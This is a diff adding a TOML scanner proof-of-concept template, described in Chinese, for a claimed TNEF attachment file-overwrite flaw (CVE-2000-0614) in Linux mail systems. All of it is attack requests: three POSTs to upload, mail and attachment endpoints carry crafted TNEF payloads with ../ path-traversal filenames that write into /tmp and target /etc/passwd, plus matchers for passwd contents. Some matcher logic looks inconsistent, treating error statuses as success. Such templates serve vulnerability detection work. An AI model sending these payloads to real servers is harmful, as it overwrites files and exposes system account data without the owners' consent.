@@ -1,0 +1,115 @@
+[info]
+author = "AVE"
+description = "检测目标 Linux 邮件系统是否存在 TNEF 解压任意文件写入漏洞。通过向附件处理接口发送包含绝对路径的恶意 TNEF 载荷，验证是否可触发路径遍历覆盖任意文件。"
+id = "POC-AVE-2000-1314"
+name = "CVE-2000-0614 TNEF Arbitrary File Overwrite PoC"
+severity = "critical"
+tags = [
+    "cve-2000-0614",
+    "tnef",
+    "path-traversal",
+    "CWE-22",
+]
+vuln_id = [
+    "CVE-2000-0614",
+    "AVE-2000-1314",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = "attachment=AAAAeT4iAwEAAAAwAAAAAAAAAAAAAACZmZmZmZmZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvZXRjL3Bhc3N3ZAAAAAAAAAAAAEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==&filename=../../../../../../../../tmp/ave-test.txt"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE-PoC-Scanner/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "permission denied",
+    "cannot access",
+    "no such file",
+    "path traversal",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [
+    500,
+    403,
+    507,
+]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mail"
+protocol = "http"
+
+[poc.requests.body]
+content = "attachment=AAAAeT4iAwEAAAAwAAAAAAAAAAAAAACZmZmZmZmZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvZXRjL3Bhc3N3ZAAAAAAAAAAAAEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==&filename=../../../../../../../../etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE-PoC-Scanner/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "daemon:",
+    "bin:",
+    "sys:",
+]
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/attachment"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------AVE\r
+Content-Disposition: form-data; name="file"; filename="../../../../../../../../tmp/evil.txt"\r
+Content-Type: application/ms-tnef\r
+\r
+￾y>"\u0001\u00000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/etc/passwd\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000AAAA\r
+------AVE--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----AVE"
+User-Agent = "AVE-PoC-Scanner/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uploaded",
+    "success",
+    "saved",
+    "written",
+]
